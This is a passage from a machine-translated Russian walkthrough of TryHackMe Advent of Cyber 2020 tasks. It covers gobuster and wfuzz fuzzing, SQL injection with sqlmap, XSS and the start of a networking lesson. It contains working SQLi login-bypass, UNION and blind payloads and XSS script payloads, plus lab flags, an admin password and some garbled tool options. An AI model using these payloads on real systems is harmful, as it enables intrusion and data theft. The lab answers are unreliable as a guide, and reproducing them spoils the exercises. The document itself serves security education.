тому, что разработчики станут немного ленивыми и не будут защищать эти каталоги, позволяя любому, кто узнает об их 
существовании, украсть важные данные. gobuster — это инструмент, который помогает нам обнаружить эти ценные каталоги,
если они существуют. Идея самого инструмента проста: брутфорс общих путей для проверки их допустимости. Подобно тому,
как вы это делаете в своем браузере, хотя этот инструмент намного, намного быстрее. Gobuster имеет три режима:dir,
vhost и dns.      

Сегодня мы будем использовать dirрежим gobuster in, так как это наиболее вероятный режим, который вы будете 
использовать ежедневно. dir(сокращение от directory) можно выбрать с помощью gobuster dir <rest of command> 

Давайте воспользуемся таблицей ниже, чтобы проиллюстрировать, как работают списки слов:

Исходный URL-адрес	Элемент в списке слов	Конечный URL-адрес
http://example.com	резервные копии	http://example.com/backups
http://loveucmnatic.thm	Шепарды	http://loveucmnatic.thm/shepards


У Gobuster есть еще несколько маленьких трюков, он поддерживает добавление расширений, что означает, что вы также 
можете брутфорсить файлы. Мы можем использовать еще одну удобную маленькую диаграмму, чтобы визуализировать это и показать пример позже: 

Исходный URL-адрес	Элемент в списке слов	Указанное расширение	Конечный URL-адрес
http://example.com	резервное копирование	PHP-файл	http://example.com/backup.php
http://example.com	резервное копирование	текст	http://example.com/backup.txt
http://example.com	мороженое	html	http://example.com/icecream.html
Чтобы найти данные в таблице выше, мы использовали следующую команду (предполагая, что в wordlist.txt есть слова 
«backup» и «icecream»):  .gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html 

Хотя Gobuster значительно быстрее альтернатив, таких как Dirbuster на Kali Linux, он все еще ограничен списками слов 
и опциями, которые вы предоставляете. Чем больше ваш список слов соответствует цели, тем лучше будут ваши результаты.
Такие списки слов, как SecLists, содержат списки слов для определенных приложений и платформ. Вы можете использовать 
информацию, собранную в результате перечисления, чтобы определить, какой список слов может быть наиболее подходящим 
для использования. Хотя мы перейдем к совершенствованию этих навыков позже.
секлисты1

Gobuster сам по себе работает как любой другой инструмент Linux, то есть у него есть онлайн-страница man, доступная 
здесь , которую вы можете использовать в качестве справки, если хотите узнать больше о различных опциях, которые 
поддерживает gobuster. Однако давайте подробно рассмотрим несколько распространенных опций ниже:

Параметры	Описание
-у	Используется для указания URL-адреса для перечисления
-в	Используется для указания списка слов, который добавляется к URL-адресу, например,

"http://url.com/word1"

"http://url.com/word2"

"http://url.com/word3.php"
-Икс	Используется для указания расширений файлов, например «php,txt,html».
Рекомендуемый список слов  для использования:  big.txt

Мы предоставили вам списки слов на AttackBox, расположенные в "/usr/share/wordlists". Это также местоположение по 
умолчанию для списков слов в дистрибутивах для пентестинга, таких как Kali Linux. Например, "big.txt" находится по 
пути к файлу "/usr/share/wordlists/dirb/big.txt". Уделите немного времени изучению других предоставленных списков 
слов и подумайте о ситуациях, в которых их использование может быть эффективным.   

### Введение в использование wfuzz
Предпосылка wfuzz проста. Иногда вам нужно немного больше информации о том, сколько данных возвращает что-то в 
веб-приложении. Это может быть что угодно: файл, код ответа (например, 404, означающий, что URL не существует) или 
параметры, используемые в форме, похожей на форму, которую вы атаковали в День 2.  

Например, предположим, что вы проводите пентестинг приложения для создания заметок и хотите проверить, можете ли вы 
просматривать заметки других пользователей. Один из способов, которым вы можете этого добиться, — это FUZZ -инг для 
имен пользователей (с учетом того, что у каждого действительного пользователя по умолчанию будет note.txt). Наша 
команда wfuzz хотела бы следующее:wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt localhost:80/FUZZ/note.txt   

Теперь wfuzz будет запрашивать веб-сервер, используя слова, итерированные из списка слов "big.txt". Для иллюстрации:

Запрос №1: http://localhost/ admin /note.txt
Запрос №2: http://localhost/ administrator /note.txt
Запрос №3: http://localhost/ system /note.txt

Обратите внимание, как параметр " FUZZ " заменяется словами из списка слов. Мы опишем некоторые параметры, которые 
можно настроить в wfuzz, однако стоит знать, что это отобразит результаты, которые отличаются от установленных нами 
параметров. На рисунке выше мы использовали параметр, --hwчтобы скрыть все страницы, на которых есть 57 слов. 
Поскольку wfuzz нашел URL-адрес, содержащий всего 8 слов, он будет нам показан, так как это не 57 слов.

Важно знать, что вы можете провести FUZZ-тест любой части URL-адреса, то есть вы можете протестировать любые 
параметры, даже если они вам неизвестны. 
Как и любой инструмент на базе Linux, wfuzz также имеет полезную страницу руководства здесь , где подробно описаны 
некоторые из более продвинутых опций, доступных вам. Хотя я добавил некоторые из более полезных опций в таблицу ниже: 

Параметры	Описание
-с	Показывает вывод в цвете
-д	Укажите параметры, которые вы хотите использовать для фаззинга, где данные кодируются для HTML-формы.
-з	Указывает, что заменит FUZZ в запросе. Например -z file,big.txt. Мы говорим wfuzz искать файлы, заменяя "FUZZ" 
словами внутри "big.txt" 
--хк	Не показывать определенные коды ответов http. То есть не показывать ответы 404, которые указывают на то, 
что файл не существует, или " 200 ", который указывает на то, что файл существует. 
--hl	Не показывать определенное количество строк в ответе
--хх	Не показывать для определенного количества символов


Давайте соберем это вместе и продемонстрируем некоторые из этих опций. Допустим, мы хотим провести фаззинг 
приложения на http://shibes.thm/login.php, чтобы найти правильные учетные данные для формы входа. Вспомнив наши 
знания из Дня 2, мы знаем все о параметрах URL! Мы можем немного поразмышлять о том, какие параметры может 
использовать форма входа usernameи password, верно? Стоит попробовать! Наша команда wfuzz будет выглядеть так:wfuzz 
-c -z file,mywordlist.txt -d “username=FUZZ&password=FUZZ” -u http://shibes.thm/login.php

Теперь wfuzz будет перебирать предоставленный нами список слов и заменять значения « FUZZ », указанные в параметрах 
« username » и « password ». 

Испытание

Разверните как экземпляр, прикрепленный к этой задаче (зеленая кнопка развертывания), так и AttackBox, нажав синюю 
кнопку «Запустить AttackBox» в верхней части страницы. Подождав 5 минут, перейдите на веб-сайт (MACHINE_IP) в 
браузере AttackBox.  

Вам решать, хотите ли вы создать список слов самостоятельно или использовать более крупный список слов, 
расположенный в /opt/AoC-2020/Day-4/wordlistAttackBox. Список слов также доступен для загрузки , если вы используете 
свою собственную машину.  

Подводя итог, используйте инструменты и методы, описанные в сегодняшнем киберпространстве; найдите API, найдите нужный пост и верните форумы Elf!



### Как подойти к решению этой проблемы

Поскольку мы знаем, что теоретически существует каталог API, мы можем использовать gobuster для перечисления 
веб-сайта и посмотреть, сможем ли мы что-нибудь найти. Затем, предположив, что мы что-то находим, мы должны 
исследовать это на предмет интересных файлов. Допустим, мы затем находим то, что, по-видимому, содержит журналы, мы 
знаем, что мы ищем по дате, поэтому мы можем сделать вывод, что есть большая вероятность того, что мы будем 
использовать параметр даты для взаимодействия с API . Мы также знаем, что API принимает дату в виде ГГГГММДД. Список 
слов в этом формате можно найти в подсказке для этой задачи, хотя, если вы хотите дополнительную задачу, вы можете 
попробовать создать список слов в этом формате самостоятельно.      

Наконец, API могут не возвращать данные, если не переданы соответствующие параметры, поэтому, зная это, мы можем 
использовать параметры в wfuzz для фильтрации параметров, которые ничего не возвращают. 

Учитывая все это, мы должны иметь возможность получить флаг.

Рекомендуемые номера:
TryHackMe | ZTH: Веб 2

TryHackMe | CC: Тестирование на проникновение

### Ответить на вопросы ниже
Разверните AttackBox (синяя кнопка "Start AttackBox") и машину задач (зеленая кнопка на этой задаче), если вы еще 
этого не сделали. После того, как оба развернуты, откройте FireFox на AttackBox и скопируйте/вставьте IP машины 
(MACHINE_IP) в строку поиска браузера.  
```commandline
Ответ не нужен
```
Учитывая URL-адрес « http://shibes.xyz/api.php », как будет выглядеть вся команда wfuzz для запроса параметра 
«breed» с использованием списка слов «big.txt» (предположим, что «big.txt» находится в вашем текущем каталоге)? 

Примечание: по юридическим причинам не запускайте эту команду, так как сайт, о котором идет речь, не давал согласия 
на фаззинг! 
```commandline
wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ
```
Используйте GoBuster (против развернутой вами цели — не домена shibes.xyz), чтобы найти каталог API. Какой файл там?
```commandline
site-log.php
```
Fuzz the date option on the file you found in the API directory. Какой флаг отображается в правильном посте?
```commandline
THM{D4t3_AP1}
```

## Задание 10
Посмотрите видео DarkStar о решении этой задачи!

После прошлогодней атаки Санта и команда безопасности упорно трудились над возрождением личного портала Санты. Таким 
образом, «форум Санты 2» был запущен. 

После атаки логи показали, что кто-то нашел панель Санты на сайте и вошел в его учетную запись! После этого они 
смогли сбросить всю базу данных списков подарков, получив все подарки 2020 года в свои руки. Злоумышленник угрожал 
опубликовать файл wishlist.txt, содержащий всю информацию, но, к счастью для нас, его поймало CBI (Рождественское 
бюро расследований) до этого. На  MACHINE_IP:8000 вы найдете копию сайта, и ваша цель — повторить действия 
злоумышленника, сбросив список подарков!    

Задача создана Swafox

https://i.imgur.com/ec9T8ya.png

### Что такое SQL- инъекция?
Атака SQL - инъекции (SQLi) заключается во внедрении SQL- запроса в удаленное веб-приложение. Успешный SQL- 
инъекционный эксплойт может считывать конфиденциальные данные из базы данных (имена пользователей и пароли), 
изменять данные базы данных (добавлять/удалять), выполнять административные операции в базе данных (например, 
закрывать базу данных) и в некоторых случаях выполнять команды в операционной системе.   

### SQL- фон
SQL — это язык, используемый в программировании для общения с базами данных. Это чрезвычайно удобный язык, который 
позволяет разработчикам легко организовывать данные в различные структуры. К сожалению, преимущество всегда 
сопровождается недостатком: даже небольшая ошибка в конфигурации кода SQL может привести к потенциальной инъекции SQL.  

Я советую вам быстро просмотреть это руководство по командам SQL , чтобы ознакомиться с ними:

Список команд SQL | Codecademy

В любом случае, при атаке SQL- инъекции мы в основном используем только 4 команды: SELECT, FROM, WHERE и UNION.

### SQL- команда	Описание
ВЫБИРАТЬ	Используется для выбора данных из базы данных.
ОТ	Используется для указания таблицы, из которой следует выбрать или удалить данные.
ГДЕ	Используется для извлечения только тех записей, которые удовлетворяют указанному условию.
СОЮЗ	Используется для объединения результатов двух или более операторов SELECT.
Важно отметить, что 1=1в SQL это означает True(скоро вы поймете, почему я об этом упоминаю).

Как работает атака SQLi ?
SQLi выполняется посредством злоупотребления параметром PHP GET (например, ?username= или ?id= ) в URL-адресе 
уязвимой веб-страницы, например, тех, что рассмотрены в День 2. Обычно они находятся в полях поиска и на страницах 
входа в систему, поэтому вам, как тестировщику на проникновение, необходимо их записать.  

Вот пример поля ввода имени пользователя, написанного на PHP :

`<?php $username = $_GET['username']; $result = mysql_query("SELECT * FROM users WHERE username='$username'"); ?>`
После того, как переменная usernameбыла введена в код, PHP автоматически использует SQL для выбора всех 
пользователей с указанным именем пользователя. Именно этот факт может быть использован злоумышленником. 

Допустим, злонамеренный пользователь вводит кавычки ( ' ) в качестве имени пользователя. Тогда код SQL будет 
выглядеть следующим образом: 

`SELECT * FROM users WHERE username='''`
Как вы видите, эта метка создает третью и генерирует ошибку, поскольку имя пользователя должно быть указано только с 
двумя. Именно эта ошибка используется для эксплуатации SQL- инъекции. 

В общем случае SQL-инъекция — это атака, при которой ваша цель — нарушить логику выполнения SQL-кода, внедрить свою 
собственную, а затем «исправить» сломанную часть, добавив комментарии в конце. 

https://i.imgur.com/U5Eyw5z.png

Графическая интерпретация

Наиболее часто используемые комментарии для полезных нагрузок SQLi :

--+ // /*
Обход входа с помощью SQL- инъекции
Одно из самых мощных применений SQL- инъекции — это, безусловно, обход входа в систему. Он позволяет злоумышленнику 
получить доступ к ЛЮБОЙ учетной записи, если он знает либо имя пользователя, либо пароль к ней (чаще всего вы знаете 
только имя пользователя).  

Сначала давайте выясним причину, по которой это возможно. Допустим, наше приложение для входа использует PHP для 
проверки соответствия имени пользователя и пароля базе данных с помощью следующего SQL- запроса: 

SELECT username,password FROM users WHERE username='$username' and password='$password'
Как вы видите, запрос использует введенные имя пользователя и пароль для проверки его в базе данных.

Что произойдет, если мы введем ' or true --туда поле имени пользователя? Это превратит приведенный выше запрос в следующий:

SELECT username,password FROM users WHERE username='' or true -- and password=''
В --этом случае закомментирована часть проверки пароля, из-за чего приложение забывает проверить правильность пароля.
Этот трюк позволяет вам войти в любую учетную запись, просто поместив имя пользователя и полезную нагрузку сразу 
после него.  

Обратите внимание, что некоторые веб-сайты могут использовать другой SQL- запрос, например:

SELECT username,pass FROM users WHERE username=('$username') and password=('$password')
В этом случае вам придется добавить одну скобку к вашей полезной нагрузке, вот так: ') or true–чтобы все заработало.

Вы можете попрактиковаться в обходе входа на развернутой машине, порт 3000 (сначала перейдите на , 
MACHINE_IP:3000/init.phpа затем на MACHINE_IP:3000). Я поместил там дополнительное интерактивное упражнение. Оно 
покажет вам весь вывод бэкенда, что позволит вам экспериментировать и практиковаться с командами SQL.  

Слепая SQL- инъекция
В некоторых случаях разработчики становятся достаточно умными, чтобы смягчить SQL- инъекцию, ограничивая приложение 
от отображения любой ошибки. К счастью, это не означает, что мы не можем выполнить атаку. 
Слепая SQL- инъекция опирается на изменения в веб-приложении во время атаки. Другими словами, ошибка в SQL- запросе 
будет заметна в какой-то другой форме (например, измененное содержимое или другое). 

Поскольку в этой ситуации мы можем только увидеть, была ли произведена ошибка или нет, слепой SQLi выполняется путем 
задавания вопросов «Да» или «Нет» базе данных (Ошибка = «Нет», Нет ошибки = «Да»). 
С помощью этой системы злоумышленник может угадать имя базы данных, прочитать столбцы и т. д. Слепой SQLi займет 
больше времени, чем другие типы, но может быть наиболее распространенным в дикой природе. 

Начните с поиска способа вызвать ошибку SQL , а затем исправьте ее.

https://i.imgur.com/CxxUthP.png

Взлом приложения

https://i.imgur.com/mpYUwOS.png

Исправление — Обратите внимание, что приложение не вывело никаких ошибок, хотя я явно вызвал ошибку SQL .

Для того, чтобы задать вопросы, вы можете использовать функцию SQL SUBSTR() . Она извлекает подстроку из строки и 
позволяет нам сравнивать подстроку с пользовательским символом ASCII. 

substr((select database()),1,1)) = 115
Приведенный выше код запрашивает у базы данных, равна ли первая буква ее имени числу 155 («s» в таблице ASCII ).

Теперь поместите это в полезную нагрузку:

`?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+`
Полезная нагрузка — вот в чем вопрос. Если приложение не производит никаких изменений, то ответ — «Да» (первая буква 
базы данных — «s»). Любая ошибка или изменение = «Нет». 

https://i.imgur.com/f1C2aWx.png

Примечание: Вы также можете использовать методы слепого внедрения SQLi в «открытой» ситуации.

SQL- инъекция UNION
UNION SQLi в основном используется для быстрого перечисления баз данных, поскольку оператор UNION позволяет 
объединять результаты нескольких операторов SELECT одновременно. 

Атака UNION SQLi   состоит из 3 этапов:

- Нахождение количества столбцов
- Проверка пригодности колонок
- Атакуйте и получите интересные данные.
Определение количества столбцов, необходимых для атаки UNION с использованием SQL- инъекции
Есть два способа обнаружить его:

Первый вариант подразумевает внедрение серии запросов ORDER BY до тех пор, пока не возникнет ошибка. Например:

`' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- # and so on until an error occurs`
(Последнее значение перед ошибкой будет указывать количество столбцов.)

Второй способ (наиболее распространенный и эффективный) предполагает отправку серии полезных нагрузок UNION SELECT с 
рядом значений NULL: 

`' UNION SELECT NULL-- ' UNION SELECT NULL,NULL-- ' UNION SELECT NULL,NULL,NULL-- # until the error occurs`
Ошибки нет = количество NULL совпадает с количеством столбцов.

Поиск столбцов с полезным типом данных в атаке UNION с использованием SQL- инъекции
Как правило, интересные данные, которые вы хотите получить, будут в строковой форме. Уже определив количество 
требуемых столбцов (например, 4), вы можете проверить каждый столбец, чтобы проверить, может ли он содержать 
строковые данные, заменив одну из полезных нагрузок UNION SELECT строковым значением. В случае 4 вы должны отправить:  

`' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION 
SELECT NULL,NULL,NULL,'a'-- `
Ошибки нет = тип данных полезен для нас (строка).

Использование атаки UNION с SQL- инъекцией для извлечения интересных данных
Определив количество столбцов и выяснив, какие столбцы могут содержать строковые данные, вы, наконец, можете 
приступить к извлечению интересных данных. 

Предположим, что:

Первые два шага показали ровно два существующих столбца с полезным типом данных.
База данных содержит таблицу с именем «пользователи» со столбцами «имя пользователя» и «пароль».
В этой ситуации вы можете получить содержимое таблицы пользователя, отправив входные данные:

' UNION SELECT username, password FROM users --
Вот небольшой список того, что вам хотелось бы получить:

база данных()
пользователь()
@@версия
имя пользователя
пароль
имя_таблицы
имя_столбца
### SQLMap
SQLMap — это инструмент для тестирования на проникновение с открытым исходным кодом, который автоматизирует процесс 
обнаружения и эксплуатации уязвимостей SQL-инъекций и захвата серверов баз данных. Это невероятный инструмент, 
который можно освоить за несколько минут. Он уже включен в AttackBox от THM, или вы можете установить его локально, 
запустив:   

git clone --depth 1 <https://github.com/sqlmapproject/sqlmap.git> sqlmap-dev
Вот некоторые из наиболее распространенных параметров, которые следует настроить при использовании SQLMap :

Команда	
--url	Укажите URL для атаки
--dbms	Сообщите SQLMap тип работающей базы данных.
--свалка	Выгрузить данные из базы данных, которую использует приложение.
--dump-all	Дамп ВСЕЙ базы данных
--партия	SQLMap запустится автоматически и не будет запрашивать ввод данных пользователем.

Давайте покажем пример команды SQLMap. Допустим, у нас есть уязвимая форма входа, расположенная по адресу " 
http://tbfc.net/login.php ". ( Обратите внимание, что это всего лишь пример, пожалуйста, не применяйте SQLMap к 
этому веб-сайту, так как владелец не давал на это согласия. ) Мы будем использовать это вместе с тем --url, чтобы 
указать SQLMap , где следует проводить атаку. т.е.sqlmap --url http://tbfc.net/login.php   

Где мы затем можем перейти к перечислению данных, которые находятся в базе данных приложения, с такими опциями, как 
--tablesи --columns. Оставив наш окончательный SQLMap выглядящим следующим образом:sqlmap --url http://tbfc.
net/login.php --tables --columns  

Опять же, tbfc.net приведен в качестве примера, пожалуйста, не совершайте никаких атак на этот сайт.

Шпаргалку с дополнительными фрагментами команд SQLMap можно найти здесь.
### SQLMap и BurpSuite
Наиболее полезной функцией sqlmap является его интеграция с BurpSuite.

С помощью BurpSuite вы можете захватывать и сохранять информацию о входе или поиске для использования с SQLMap. Это 
делается путем перехвата запроса . Вам нужно будет настроить браузер на использование BurpSuite в качестве 
прокси-сервера для захвата этого запроса. AttackBox упростил это для вас с помощью расширения FoxyProxy в Firefox.  

Сначала запустим BurpSuite, расположенный в «Приложения -> Интернет -> BurpSuite Community Edition» на AttackBox.
Используйте Firefox для посещения приложения, которое, как мы подозреваем, уязвимо.
Включите FoxyProxy в Firefox:

Подайте запрос на веб-приложение, которое, как мы подозреваем, уязвимо
Отправьте запрос из вкладки «Прокси» на репитер, щелкнув правой кнопкой мыши и нажав «Отправить на репитер».
Обратите внимание, что наш запрос теперь находится на вкладке «Повторитель»:

Наконец, сохраните этот запрос, щелкнув правой кнопкой мыши и нажав «Сохранить элемент».

Затем мы можем использовать этот запрос в SQLMap :

`sqlmap -r filename`
SQLMap автоматически преобразует запрос и использует базу данных для вас.

Испытание
Посетите уязвимое приложение в Firefox, найдите секретную панель входа Санты и обойдите вход. Используйте некоторые 
команды и инструменты, рассмотренные в сегодняшнем задании, чтобы ответить на вопросы № 3–6. 

Санта читает документацию, которую он написал при настройке приложения. Там написано:

TODO Санты: Посмотрите на альтернативные системы баз данных, которые лучше, чем sqlite. Также не забудьте, что вы 
установили W eb A pplication Firewall (WAF) после прошлогодней атаки. Если вы забыли команду, вы можете указать 
SQLMap попытаться обойти WAF, используя--tamper=space2comment  

Ресурсы
Ознакомьтесь с этой шпаргалкой:  swisskyrepo/PayloadsAllTheThings

Список полезной нагрузки:  payloadbox/sql-injection-payload-list

Подробный учебник по SQL-инъекциям:  основы SQLi

### Ответить на вопросы ниже
Какова секретная панель входа в систему Санты, если не использовать метод подбора паролей к каталогам?
```commandline
/santapanel
```
Посетите секретную панель входа в систему Санты и обойдите вход с помощью SQLi
```commandline
Ответ не нужен
```
Сколько записей в базе данных подарков?
```commandline
22
```
О чем просил Павел?
```commandline
Github Ownership
```
Что такое флаг?
```commandline
thmfox{All_I_Want_for_Christmas_Is_You}
```
Какой пароль администратора?
```commandline
EhCNSWzzFP6sc7gB
```
## Задание 11
Посмотрите видео DarkStar о решении этой задачи .


В этом году Санта захотел полностью перейти на цифровые технологии и придумал систему «Загадай желание!». Это 
чрезвычайно простое веб-приложение, которое позволяет людям анонимно делиться своими желаниями с другими. К 
сожалению, сразу после хакерской атаки команда безопасности обнаружила, что кто-то взломал «Загадай желание!». 
Большинство желаний исчезло, и теперь сайт перенаправляет на вредоносный сайт. Злоумышленник мог сделать вид, что 
загадал желание, и поместить вредоносный запрос на сервер! Команда безопасности подняла для вас резервный сервер на  
MACHINE_IP:5000. Ваша цель — найти способ, которым злоумышленник мог использовать приложение.

От Swafox

https://i.imgur.com/MuJLqZu.png

### Что такое XSS ?
Межсайтовый скриптинг (XSS) — это веб-уязвимость, которая позволяет злоумышленнику скомпрометировать взаимодействие 
пользователей с уязвимым приложением. Уязвимости межсайтового скриптинга обычно позволяют злоумышленнику 
маскироваться под пользователя-жертву и выполнять любые действия, которые пользователь может выполнять. Если у 
пользователя-жертвы есть привилегированный доступ в приложении (например, администратор), то злоумышленник может 
получить полный контроль над всеми функциями и данными приложения. Даже если пользователь имеет низкие привилегии, 
XSS все равно может позволить злоумышленнику получить большой объем конфиденциальной информации.     

### Почему это так работает?
XSS эксплуатируется, когда вредоносный контент отправляется в веб-браузер, часто принимая форму полезной нагрузки 
JavaScript, но также может включать HTML, Flash или любой другой тип кода, который может выполнить браузер. 
Разнообразие атак, основанных на XSS , практически безгранично, но все они сводятся ровно к двум типам: хранимым и 
отраженным.   

### Типы XSS
Stored XSS работает, когда определенный вредоносный JavaScript отправляется и позже сохраняется непосредственно на 
веб-сайте. Например, комментарии к записи в блоге, никнеймы пользователей в чате или контактные данные в заказе 
клиента. Другими словами, в любом контенте, который постоянно присутствует на веб-сайте и может быть просмотрен жертвами.  


<!-- Normal comment--> <p>      Your comment goes here </p> <!--Malicious comment--> <p>      <script>          evilcode()      </script> </p>
Допустим, у нас есть веб-сайт с комментариями (код выше). Обычный комментарий помещается под <p></p>теги и 
отображается на веб-сайте. Злонамеренный пользователь может поместить <script></script>теги в это поле, чтобы 
выполнять evilcode()функцию каждый раз, когда пользователь видит этот комментарий.  

Сохраненный XSS дает злоумышленнику преимущество «внедрения» вредоносного JavaScript за изображениями. Используя 
<img>атрибут, можно выполнить пользовательский код JS при просмотре или щелчке изображения. Например: 

<img src='LINK' onmouseover="alert('xss')">
В этом случае злоумышленник внедряет изображение, которое будет выполнено, alert('xss')если пользователь наведет на 
него указатель мыши. 

Допустим, у нас есть веб-приложение, позволяющее пользователям оставлять комментарии под публикацией.

https://i.imgur.com/Z5sYzsM.png

Злоумышленник может воспользоваться этим, поместив полезную нагрузку XSS вместо своих комментариев и заставив всех 
выполнить пользовательский код javascript. 
Вот что произойдет, если мы используем указанную выше <img>полезную нагрузку:

https://i.imgur.com/3t16xkO.png

Вредоносная картинка выполняет кастом alert('xss')после просмотра. Это наиболее распространенный пример хранимого XSS .

Reflected — это еще один тип XSS, который выполняется непосредственно в HTTP- запросе и требует от злоумышленника 
выполнения немного большей работы. Примером этого может быть вредоносный javascript в ссылке или поле поиска. Код не 
хранится на сервере напрямую, что означает, что целевой пользователь должен скомпрометировать себя, нажав на ссылку.  

Вот краткий пример URL-адреса с включенным вредоносным кодом JavaScript:

<https://somewebsite.com/titlepage?id=> <script> evilcode() </script>
Любой пользователь, нажимающий на ссылку, выполнит evilcode()функцию, в конечном итоге попав под атаку XSS .

Предположим, что веб-сайт использует ключевое слово строки запроса в своем URL-адресе 10.10.100.27/reflected?
keyword=helloследующим образом: 

https://i.imgur.com/n2EFUFY.png

Поисковый запрос помещается после этого параметра ключевого слова. XSS может быть использован путем помещения 
полезной нагрузки вместо поискового запроса. 
URL начинается с 10.10.100.27/reflected?keyword=. Добавляя текст к ключевому слову, мы можем выполнить отраженный 
XSS ,10.10.100.27/reflected?keyword=<script>alert(1)</script>  что приводит к появлению окна оповещения с 1 на нашем 
экране.  

https://i.imgur.com/GloKxur.png
Бинго! XSS был успешно использован!

Как обнаружить XSS ?
Как отраженные, так и сохраненные уязвимости XSS можно обнаружить схожим образом: с помощью HTML-тегов, таких как 
<h1></h1>, <b></b>или других. Идея состоит в том, чтобы попробовать ввести текст с этими тегами и посмотреть, 
приведет ли это к каким-либо различиям. Любое изменение размера или цвета текста немедленно указывает на уязвимость XSS.  

Но иногда бывает сложно найти их вручную, и, конечно, мы не можем забывать об элементарной человеческой ошибке. К 
счастью, для этого есть решение! OWASP ZAP — это сканер безопасности веб-приложений с открытым исходным кодом. Он 
может автоматически обнаруживать веб-уязвимости.  
Вы можете запустить ZAP, перейдя в «Приложения -> Веб -> Owasp Zap» на панели атаки:


После запуска вы увидите довольно простой интерфейс.


Справа вы можете увидеть кнопку с названием «Автоматическое сканирование». Нажмите на нее, и она перенесет вас на 
страницу конфигурации атаки. 


Теперь просто введите целевой URL в поле «URL для атаки» и нажмите «Атака»!
Через некоторое время все уязвимости будут отображены на вкладке «Оповещения»:



Бонус: смягчение последствий XSS
Правило простое: все пользовательские данные должны быть очищены как на стороне клиента, так и на стороне сервера, 
чтобы удалить потенциально вредоносные символы. На каждой платформе есть библиотеки, которые помогут с этим. 
Умные разработчики всегда должны внедрять фильтр в любое поле ввода текста и следовать строгому набору правил 
относительно обработки введенных данных. Для получения дополнительной информации об этом ознакомьтесь с руководством 
OWASP:  

OWASP /Серия шпаргалок

Испытание
Если вы не являетесь подписчиком, пожалуйста, подождите больше времени для развертывания этой виртуальной машины (больше обычных 5 минут).
Ресурсы
Ознакомьтесь с этим замечательным руководством по XSS:  swisskyrepo/PayloadsAllTheThings
Список общих полезных нагрузок, которые вы можете попробовать:  payloadbox/xss-payload-list
Для получения дополнительных руководств по OWASP Zap посетите следующую комнату: Learn OWASP Zap

### Ответить на вопросы ниже
Разверните AttackBox (синяя кнопка "Start AttackBox") и машину задач (зеленая кнопка на этой задаче), если вы еще 
этого не сделали. После того, как оба развернуты, откройте Firefox на AttackBox и скопируйте/вставьте IP машины ( 
http://MACHINE_IP:5000 ) в строку поиска браузера ( веб-сервер работает на порту 5000, поэтому убедитесь, что это 
включено в ваши веб-запросы ).   
```commandline
Ответ не нужен
```
Какой тип уязвимости использовался для эксплуатации приложения?
```commandline
Stored cross-site scripting
```
Какую строку запроса можно использовать для создания отраженной XSS-атаки?
```commandline
q
```
Запустите приложение OWASP ZAP
```commandline
Ответ не нужен
```
Запустить автоматическое сканирование ZAP (zaproxy) на цели. Сколько оповещений XSS в сканировании?
```commandline
2
```
Изучите оповещения XSS, обнаруженные ZAP. Можете ли вы сделать так, чтобы оповещение появлялось на веб-сайте 
«Загадай желание»? 
```commandline
Ответ не нужен
```
## Задание 12
Посмотрите видео DarkStar о решении этой задачи

(Javatpoint., 2018)

### История
6 утра, и Эльф МакСкиди регистрируется в штаб-квартире SOC The Best Festival Company, чтобы начать наблюдение за 
инфраструктурой TBFC. После входа в систему Эльф МакИгер приступает к чтению писем, оставленных Эльфом МакСкиди во 
время ночной смены.  

Еще больше автоматических оповещений о сканировании, ой, смотрите, еще одна группа APT. Похоже, что для Эльфа 
МакИгера это будет долгое, но легкое начало недели. 

Разбирая накопившиеся письма, Эльф МакИгер читает следующее: « СРОЧНО: обнаружена утечка данных на TBFC-WEB-01». « 
Ого! » — восклицает Эльф МакИгер. « TBFC-WEB-01? Это веб-сервер Санты! У кого есть мотив украсть оттуда данные?! ». 
Пришло время вечно бдительному Эльфу МакИгеру доказать свою состоятельность и выяснить, что именно произошло.  

Незаметно для Эльфа МакИгера, Эльф МакСкиди все это выдумал! К счастью, это не настоящая атака, а тренировочное 
упражнение, созданное перед аттестацией Эльфа МакИгера. 

Цели обучения
- Что такое IP-адреса и как они назначаются.
- Понимание TCP/IP и UDP
- 3-стороннее рукопожатие
- Краткий курс Wireshark (где он используется и почему)
- Базовая фильтрация и операторы
- Анализ наших первых нескольких PCAPS
- HTTP
- МСБ
- Испытание
Сделано с ❤ от CMNatic

### Что такое IP-адрес?
Вы часто будете слышать термин "IP-адрес" в области информационных технологий - не только TryHackMe. Сокращение от 
Internet Protocol address , я люблю объяснять эту основу сетей, используя тот же способ, которым почтовая система 
работает в реальной жизни.  

При отправке письма вы должны указать адрес, по которому письмо должно быть отправлено, и лучше всего указать свой 
адрес в качестве обратного адреса на случай, если письмо потеряется (или вы захотите сообщить получателю, как 
ответить). IP-адрес служит той же цели, но для устройств, подключенных к сети! Устройства, подключенные к Интернету, 
будут иметь два таких адреса — публичный и частный. Подумайте о частном адресе как о имени получателя в компании, 
например, Джо Смит, а публичный адрес — как о местоположении этой компании, например, 160 Kemp Road, London.    

Допустим, вы выходите в Интернет через свой компьютер. Ваш компьютер будет частью двух сетей и, в свою очередь, 
будет использовать как публичный, так и частный IP-адрес: 


Частный IP-адрес для идентификации себя среди других устройств (таких как смартфоны, телевизоры и другие компьютеры) 
в сети вашего дома. На снимке экрана ниже два устройства имеют следующий частный IP-адрес: 
https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/1.png



TryHackMe также использует эти частные адреса. Чтобы получить доступ к другим устройствам TryHackMe, таким как 
экземпляры, которые вы разворачиваете в этой комнате, вам нужно будет находиться в той же частной сети, поскольку 
эти экземпляры не подключены к Интернету. Вот почему для подключения к сети вам необходимо использовать клиент, 
такой как OpenVPN.   

MuirlandOracle объясняет, как работают эти частные IP-адреса, в своей комнате «Введение в сетевые технологии».


Ваш интернет-провайдер (ISP) предоставил вам публичный IP-адрес, который идентифицирует ваш дом в Интернете 
(Интернет — это просто много-много сетей, соединенных между собой). Используя наш пример выше, два устройства будут 
совместно использовать публичный IP-адрес для идентификации себя в Интернете:  
https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/2.png

Имя устройства	Айпи адрес	Тип IP-адреса
НАСТОЛЬНЫЙ КОМПЬЮТЕР-KJE57FD	86.157.52.21	Публичный
CMNatic-ПК	86.157.52.21	Публичный
